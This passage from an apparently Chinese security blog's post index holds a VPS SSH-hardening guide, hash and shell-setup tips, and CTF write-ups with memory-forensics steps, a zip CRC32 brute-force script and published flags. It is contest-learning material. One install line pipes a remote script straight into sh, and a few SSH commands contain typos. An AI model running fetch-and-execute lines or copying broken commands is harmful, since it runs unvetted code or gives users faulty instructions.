href="https://forensicswiki.xyz/wiki/index.php?title=RAR">https://forensicswiki.xyz/wiki/index.php?title=RAR</a></p><h3 id="主要攻击-1"><a href="#主要攻击-1" class="headerlink" title="主要攻击"></a>主要攻击</h3><h4 id="伪加密-1"><a href="#伪加密-1" class="headerlink" title="伪加密"></a>伪加密</h4><p>RAR 文件的伪加密在文件头中的位标记字段上，用 010 Editor 可以很清楚的看见这一位，修改这一位可以造成伪加密。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/6.png" alt="6"></p><p>其余明文攻击等手法依旧同 ZIP 中介绍的一样。</p><h2 id="7z"><a href="#7z" class="headerlink" title="7z"></a>7z</h2><h3 id="7z文件头"><a href="#7z文件头" class="headerlink" title="7z文件头"></a>7z文件头</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">37</span> 7A BC AF <span class="token number">27</span> 1C</code></pre><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ul><li><a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt">https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt</a></li><li><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9387711.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9387711.html</a></li><li><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html</a></li><li><a href="http://bobao.360.cn/ctf/detail/197.html">http://bobao.360.cn/ctf/detail/197.html</a></li><li><a href="https://examine2.top/2021/01/12/CTF%E4%B8%AD%E7%9A%84zip%EF%BC%88%E4%B8%8B%EF%BC%89/">https://examine2.top/2021/01/12/CTF%E4%B8%AD%E7%9A%84zip%EF%BC%88%E4%B8%8B%EF%BC%89/</a></li><li><a href="https://ctf-wiki.org/misc/archive/zip/#_3">https://ctf-wiki.org/misc/archive/zip/#_3</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希(hash)计算</title>
      <link href="/computertips/ha-xi-hash-ji-suan/"/>
      <url>/computertips/ha-xi-hash-ji-suan/</url>
      
        <content type="html"><![CDATA[<blockquote><p>hash计算是我们经常需要用到的命令，这里每个系统做个记录</p></blockquote><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><pre class="language-bash" data-language="bash"><code class="language-bash">certutil <span class="token parameter variable">-hashfile</span> filename MD5certutil <span class="token parameter variable">-hashfile</span> filename SHA1certutil <span class="token parameter variable">-hashfile</span> filename SHA256</code></pre><p>Windows还以通过安装<code>Hashtab</code>之后直接通过右键查看属性获取hash值。</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ md5sum filename$ sha1sum filename$ sha256sum filename</code></pre><h2 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h2><h3 id="系统自带："><a href="#系统自带：" class="headerlink" title="系统自带："></a>系统自带：</h3><pre class="language-bash" data-language="bash"><code class="language-bash">md5 file_nameshasum <span class="token parameter variable">-a</span> <span class="token number">1</span>/256 file_name</code></pre><h3 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h3><pre class="language-bash" data-language="bash"><code class="language-bash">openssl md5 filenameopenssl sha1 filenameopenssl sha256 filename</code></pre><h2 id="查看一个字符串的hash值"><a href="#查看一个字符串的hash值" class="headerlink" title="查看一个字符串的hash值"></a>查看一个字符串的hash值</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">'string'</span> <span class="token operator">|</span> <span class="token builtin class-name">hash</span></code></pre><p>echo -n : 不打印换行符。(注意: echo -n 后面的-n参数必须加上, 这样算出的字符串的md5值才正确)</p>]]></content>
      
      
      <categories>
          
          <category> ComputerTips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ComputerTips </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LinuxVPS安全配置</title>
      <link href="/linux/linuxvps-an-quan-pei-zhi/"/>
      <url>/linux/linuxvps-an-quan-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-SSH设置"><a href="#Linux-SSH设置" class="headerlink" title="Linux SSH设置"></a>Linux SSH设置</h1><blockquote><p>拿到一台vps后如果我们不做任何配置的话很快我们就会发现自己的vps多了大量的ssh爆破记录，因此为了让自己的vps稍微安全一点，就要对ssh的配置做一点点改动</p></blockquote><h2 id="创建普通用户"><a href="#创建普通用户" class="headerlink" title="创建普通用户"></a>创建普通用户</h2><p>一般情况新入手的vps分配的用户都是root用户，而系统中全部程序使用root运行的话相对来说不是很安全，因此我们需要新建一个普通用户</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#创建用户</span>adduser example<span class="token comment">#将用户加入sudoer</span>adduser username <span class="token function">sudo</span></code></pre><p>加入sudo组还可以通过直接修改文件的方式</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#添加可写权限</span><span class="token function">chmod</span> u+w /etc/sudoers<span class="token function">vim</span> /etc/sudoers<span class="token comment">#找到root ALL = (ALL) ALL这一行，在下一行加入</span>username ALL <span class="token operator">=</span> <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment">#最后还原文件权限</span><span class="token function">chmod</span> u-w /etc/sudoers</code></pre><p>这里插入一个小知识点。</p><ul><li><p>useradd在使用该命令创建用户是不会在&#x2F;home下自动创建与用户名同名的用户目录，而且不会自动选择shell版本，也没有设置密码，那么这个用户是不能登录的，需要使用passwd命令修改密码。</p></li><li><p><a href="https://www.linuxcool.com/adduser">adduser</a>在使用该命令创建用户是会在&#x2F;home下自动创建与用户名同名的用户目录，系统shell版本，会在创建时会提示输入密码，更加友好。</p></li></ul><h2 id="SSH安全设置"><a href="#SSH安全设置" class="headerlink" title="SSH安全设置"></a>SSH安全设置</h2><h3 id="SSH设置禁止ROOT登录"><a href="#SSH设置禁止ROOT登录" class="headerlink" title="SSH设置禁止ROOT登录"></a>SSH设置禁止ROOT登录</h3><p>1.修改SSH配置文件，将下面一行的注释取消并修改yes为no</p><pre class="language-console" data-language="console"><code class="language-console">#编辑ssh配置文件vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config-------------------------PermitRootLogin no</code></pre><h3 id="更改默认端口"><a href="#更改默认端口" class="headerlink" title="更改默认端口"></a>更改默认端口</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config-------------------------<span class="token comment">#Port 22</span>Port <span class="token number">29888</span></code></pre><h3 id="更改密钥登录"><a href="#更改密钥登录" class="headerlink" title="更改密钥登录"></a>更改密钥登录</h3><p>1.生成密钥</p><pre class="language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa</code></pre><p>2.传输密钥到服务器<br>可以在本机使用一键完成</p><pre class="language-bash" data-language="bash"><code class="language-bash">ssh-copy-id user@serverip</code></pre><p>也可以手动完成配置，在本机上执行此命令，上传公钥</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> .ssh<span class="token function">scp</span> <span class="token parameter variable">-P</span> id_rsa.pub user@serverip:/tmp<span class="token comment">#在服务器上执行此命令，追加到authorized_keys</span><span class="token builtin class-name">cd</span> /tmp <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> id_rsa.pub <span class="token operator">>></span>s ~/.ssh/authorized_keys<span class="token comment">#更改权限</span><span class="token function">chmod</span> <span class="token number">600</span> ~/.ssh/authorized_keys</code></pre><ol start="3"><li>配置sshd开启密钥登录<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># vi /etc/ssh/sshd_config</span><span class="token comment">#RSA认证</span>RSAAuthentication <span class="token function">yes</span> <span class="token comment">#开启公钥验证</span>PubkeyAuthentication <span class="token function">yes</span><span class="token comment">#验证文件路径</span>AuthorizedKeysFile .ssh/authorized_keys <span class="token comment">#禁止密码认证</span>PasswordAuthentication no <span class="token comment">#禁止空密码</span>PermitEmptyPasswords no <span class="token comment"># 最后保存，重启sshd服务</span><span class="token function">sudo</span> <span class="token function">service</span> sshd restart</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统安装oh-my-zsh</title>
      <link href="/linux/linux-xi-tong-an-zhuang-oh-my-zsh/"/>
      <url>/linux/linux-xi-tong-an-zhuang-oh-my-zsh/</url>
      
        <content type="html"><![CDATA[<h1 id="Oh-My-Zsh安装"><a href="#Oh-My-Zsh安装" class="headerlink" title="Oh-My-Zsh安装"></a>Oh-My-Zsh安装</h1><ol><li><p>检查当前可用shell<code>cat /etc/shells</code>，如果没有zsh则需要安装zsh<code>apt install zsh</code></p></li><li><p>查看当前使用shell<code>echo $SHELL</code>，如果不是zsh则需要切换到zsh<code>chsh -s /bin/zsh</code></p></li><li><p>安装oh-my-zsh</p><p><code>sh -c &quot;$(proxychains curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</code></p></li><li><p>下载zsh-syntax-highlighting 语法高亮插件</p><p><code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;/plugins/zsh-syntax-highlighting</code></p></li><li><p>下载 zsh-autosuggestions 自动提示插件</p><p><code>git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;/plugins/zsh-autosuggestions</code></p></li><li><p>配置.zshrc文件</p><pre class="language-none"><code class="language-none">vim .zshrcZSH_THEME&#x3D;&quot;ys&quot;plugins&#x3D;(git zsh-syntax-highlighting zsh-autosuggestions)source .zshrc</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年工业信息安全技能大赛线下巡回赛-济南站</title>
      <link href="/ctf/competition/2021icsc-jinan/"/>
      <url>/ctf/competition/2021icsc-jinan/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-4G工业企业通信流量"><a href="#0x01-4G工业企业通信流量" class="headerlink" title="0x01 4G工业企业通信流量"></a>0x01 4G工业企业通信流量</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>从通信流量中找出隐藏在其中的信息。答案格式：flag{****************}</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>打开题目附件流量包，在短信里面获取flag{IC7856@qwe}<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210830142354.png" alt="20210830142354"></p><h2 id="0x02-可疑的文件"><a href="#0x02-可疑的文件" class="headerlink" title="0x02 可疑的文件"></a>0x02 可疑的文件</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>一天，运维小明在使用电脑时，突然蓝屏了，当小明再次打开电脑时，桌面上突然多了一个可疑的文件，正当小明准备查看时，电脑再次蓝屏，小明立刻将硬盘拔下来并保存。你能帮助小明查看一下文件的内容是什么吗？答案格式：flag{****************}</p><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>打开题目附件可以看到是个raw文件，因此使用volatility进行分析</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#使用volatility进行内存分析的时候，首先要判断这是从什么操作系统里面dump出的内存</span>$ volatility imageinfo <span class="token parameter variable">-f</span> test-20201029-020458.rawVolatility Foundation Volatility Framework <span class="token number">2.6</span>INFO    <span class="token builtin class-name">:</span> volatility.debug    <span class="token builtin class-name">:</span> Determining profile based on KDBG search<span class="token punctuation">..</span>.          Suggested Profile<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> WinXPSP2x86, WinXPSP3x86 <span class="token punctuation">(</span>Instantiated with WinXPSP2x86<span class="token punctuation">)</span>                     AS Layer1 <span class="token builtin class-name">:</span> IA32PagedMemoryPae <span class="token punctuation">(</span>Kernel AS<span class="token punctuation">)</span>                     AS Layer2 <span class="token builtin class-name">:</span> FileAddressSpace <span class="token punctuation">(</span>/Users/***/0x02可疑的文件/题目附件/test-20201029-020458.raw<span class="token punctuation">)</span>                      PAE <span class="token builtin class-name">type</span> <span class="token builtin class-name">:</span> PAE                           DTB <span class="token builtin class-name">:</span> 0xaff000L                          KDBG <span class="token builtin class-name">:</span> 0x80546ae0L          Number of Processors <span class="token builtin class-name">:</span> <span class="token number">1</span>     Image Type <span class="token punctuation">(</span>Service Pack<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> <span class="token number">3</span>                KPCR <span class="token keyword">for</span> CPU <span class="token number">0</span> <span class="token builtin class-name">:</span> 0xffdff000L             KUSER_SHARED_DATA <span class="token builtin class-name">:</span> 0xffdf0000L           Image <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2020</span>-10-29 02:05:01 UTC+0000     Image <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2020</span>-10-29 <span class="token number">10</span>:05:01 +0800</code></pre><p>可以看到这是一个xp系统里dump出来的内存，接下来的分析里指定xp进行分析。各种插件的用法可以参考<a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference">官方wiki</a></p><p>这里在查看IE浏览器缓存的时候发现了flag.png这个东西，因此先把这个dump出来</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ volatility <span class="token parameter variable">-f</span> test-20201029-020458.raw <span class="token parameter variable">--profile</span><span class="token operator">=</span>WinXPSP2x86 iehistoryVolatility Foundation Volatility Framework <span class="token number">2.6</span>**************************************************Process: <span class="token number">1436</span> explorer.exeCache <span class="token builtin class-name">type</span> <span class="token string">"DEST"</span> at 0x1389f5Last modified: <span class="token number">2020</span>-10-29 <span class="token number">10</span>:04:51 UTC+0000Last accessed: <span class="token number">2020</span>-10-29 02:04:52 UTC+0000URL: Administrator@file:///C:/Documents%20and%20Settings/Administrator/Lhb/flag.png$ volatility <span class="token parameter variable">-f</span> test-20201029-020458.raw <span class="token parameter variable">--profile</span><span class="token operator">=</span>WinXPSP2x86 filescan <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">'flag'</span>Volatility Foundation Volatility Framework <span class="token number">2.6</span>0x00000000010e3740      <span class="token number">1</span>      <span class="token number">0</span> R--r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>桌面<span class="token punctuation">\</span>flag.png0x00000000010e3740      <span class="token number">1</span>      <span class="token number">0</span> R--r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>桌面<span class="token punctuation">\</span>flag.png0x000000000265e318      <span class="token number">1</span>      <span class="token number">0</span> RW-rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Recent<span class="token punctuation">\</span>flag.lnk$ volatility <span class="token parameter variable">-f</span> test-20201029-020458.raw <span class="token parameter variable">--profile</span><span class="token operator">=</span>WinXPSP2x86 dumpfiles <span class="token parameter variable">-Q</span> 0x00000000010e3740 <span class="token parameter variable">-D</span> ./</code></pre><p>dump完以后发现图片的内容是32个CRC，也是就是说CRC32。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210823135310.png" alt="20210823135310"></p><p>这里需要脑洞一下ZIP压缩包的CRC爆破，因此下一步就是找可疑的zip压缩包</p><pre class="language-bash" data-language="bash"><code class="language-bash"> volatility <span class="token parameter variable">-f</span> test-20201029-020458.raw <span class="token parameter variable">--profile</span><span class="token operator">=</span>WinXPSP2x86 filescan <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">'zip'</span>Volatility Foundation Volatility Framework <span class="token number">2.6</span>0x000000000076ee58      <span class="token number">1</span>      <span class="token number">0</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>zipfldr.dll0x0000000001137028      <span class="token number">1</span>      <span class="token number">0</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>桌面<span class="token punctuation">\</span>Desktop.zip0x0000000006de9b10      <span class="token number">1</span>      <span class="token number">0</span> R--r-d <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>zipfldr.dll</code></pre><p>可以看到的是题目比较良心，就搞了一个zip，dump出来看一下。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210823145411.png" alt="20210823145411"></p><p>可以看到一堆4字节大小的txt文件，因此可以确定就是crc的爆破，爆破得flag，脚本如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> string<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">CrackCrc</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> dic<span class="token punctuation">:</span>            <span class="token keyword">for</span> p <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                <span class="token keyword">for</span> q <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                    s <span class="token operator">=</span> i <span class="token operator">+</span> j <span class="token operator">+</span> p <span class="token operator">+</span> q                    <span class="token keyword">if</span> crc <span class="token operator">==</span> <span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token comment">#print s</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                        <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">CrackZip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> I <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'Desktop'</span> <span class="token operator">+</span> <span class="token string">'.zip'</span>        f <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        GetCrc <span class="token operator">=</span> f<span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.txt'</span><span class="token punctuation">)</span>        crc <span class="token operator">=</span> GetCrc<span class="token punctuation">.</span>CRC        <span class="token comment">#以上3行为获取压缩包CRC32值的步骤</span>        <span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span>        CrackCrc<span class="token punctuation">(</span>crc<span class="token punctuation">)</span>dic <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'&#123;&#125;_+/='</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>CrackZip<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x04-应急红绿灯"><a href="#0x04-应急红绿灯" class="headerlink" title="0x04 应急红绿灯"></a>0x04 应急红绿灯</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>某路口红绿灯故障启用应急红绿灯灯，南北方向绿灯Q0.0，黄灯Q0.1，红灯Q0.2，东西方向红灯Q0.5，绿灯Q0.3，黄灯Q0.4。按下I0.0启动，按下I0.1停止。由于红绿灯故障引起堵车，东西方向绿灯常亮每秒3辆，南北方向每秒4辆，绿灯闪烁路口通行车辆每秒较常亮减少1辆，黄灯闪烁通行车辆较绿灯常亮每秒减少2辆，启动应急红绿灯后每15秒统计一次路口车辆通过数据，1分钟内车辆通行情况。 东西方向用W 南北方向用N 如前15秒东西通行30 南北通行 20 W30N20 车辆均已两位表示，一辆用01表示。答案格式：flag{****************}</p><h2 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h2><p>打开题目是一个S7-200的梯形图，所以需要逐行的分析<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210823163117.png" alt="20210823163117"></p><ul><li>Network1:I0.1接通，M3.0开始的8个点位重置为0</li><li>Network2:I0.0接通，M3.0开始的1个点位置为1</li><li>Network3:M3.0接通，计时器T37开始工作，计时20s</li><li>Network4:M3.0接通，Q0.0点亮，或M3.1接通，Q0.0闪烁</li></ul><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210824092856.png" alt="20210824092856"></p><ul><li>Network5:T37计时结束，M3.1置为1，M3.0重置为0</li><li>Network6:M3.1接通，T38计时3s</li><li>Network7:T38计时结束，M3.2置为1，M3.1重置为0</li><li>Network8:M3.2接通后，Q0.1闪烁3s</li></ul><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210824094638.png" alt="20210824094638"></p><ul><li>T39计时结束，M3.3置为1，M3.2重置为0</li><li>M3.3置为1，T40计时23s</li><li>M3.3接通，Q0.2点亮，或M3.4接通且M3.3断开，Q0.2闪烁</li><li>T40计时结束，M3.4置为1，M3.3重置为0</li></ul><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210824095541.png" alt="20210824095541"></p><ul><li>M3.4接通，T41开始计时3s</li><li>T41计时结束，M3.0置为1，M3.4重置为0</li><li>M3.0或M3.1接通，Q0.5点亮；或M3.0和M3.1断开，M3.2接通，Q0.5闪烁</li><li>M3.4接通，Q0.4闪烁</li></ul><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210824100258.png" alt="20210824100258"></p><ul><li>M3.3接通，当T40剩余时间大于2s时，Q0.3点亮，当T40剩余时间小于2s时，Q0.3闪烁</li></ul><p>至此梯形图分析完毕，接下来就可以统计一分钟车流量</p><ul><li>0-15s：南北方向绿灯亮15s，东西方向红灯亮15s</li><li>15-30s：南北方向绿灯亮5s，绿灯闪烁3s，黄灯闪烁3s，红灯亮4s；东西方向，红灯亮8s，红灯闪烁3s，绿灯亮4s；</li><li>31-45s：南北方向红灯亮15s；东西方向绿灯亮15s</li><li>45-60s：南北方向红灯亮4s，红灯闪烁3s，绿灯亮8s；东西方向绿灯亮2s，闪烁2s，黄灯闪烁3s，红灯亮8s</li></ul><p>因此flag为<code>flag&#123;W00N60W12N35W45N13N32&#125;</code></p><h2 id="0x06-Modbus流量包"><a href="#0x06-Modbus流量包" class="headerlink" title="0x06 Modbus流量包"></a>0x06 Modbus流量包</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>在工控网络通信中，工作人员截取了一段奇怪的Modbus流量，请分析该流量包中隐藏的数据。答案格式：flag{****************} flag格式：flag{}。</p><h2 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h2><p>根据题目描述我们首先筛选modbus协议，发现全部是写入数据，并data区域全部有数据<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210824113847.png" alt="20210824113847"><br>那么追踪一下tcp流，发现了异常可以看到明文字符里出现了PNGIHDR，一个典型的png图片头<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210824113732.png" alt="20210824113732"></p><p>那么下一步思路也就清晰了，提数据转图片,脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> os<span class="token keyword">import</span> binasciios<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"tshark -r modbus.pcapng -2 -R 'modbus&amp;&amp;ip.src==192.168.111.138'  -T fields -e modbus.data >data.txt"</span><span class="token punctuation">)</span>data1<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">)</span>tmp<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data1<span class="token punctuation">:</span>    tmp <span class="token operator">=</span> tmp <span class="token operator">+</span> i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>data1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">,</span><span class="token string">"wb+"</span><span class="token punctuation">)</span> <span class="token comment"># filepath为你要存储的图片的全路径</span>pic <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pic<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/flag.png" alt="flag"></p><h2 id="0x11-工业协议分析"><a href="#0x11-工业协议分析" class="headerlink" title="0x11 工业协议分析"></a>0x11 工业协议分析</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>通过分析流量包中的工业协议查询隐藏的flag。答案格式：flag{****************}</p><p>##解题过程<br>打开流量包，筛选modbus协议，追踪tcp流，解base64获取flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210824115552.png" alt="20210824115552"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> base64<span class="token operator">>></span><span class="token operator">></span> flag<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'ZmxhZ3s2N2Y1YjgyNTcyNzIwOTI1fQ=='</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token string">b'flag&#123;67f5b82572720925&#125;'</span><span class="token operator">>></span><span class="token operator">></span> exit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2021icsc </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年工业信息安全技能大赛线上赛</title>
      <link href="/ctf/competition/2021icsc-online/"/>
      <url>/ctf/competition/2021icsc-online/</url>
      
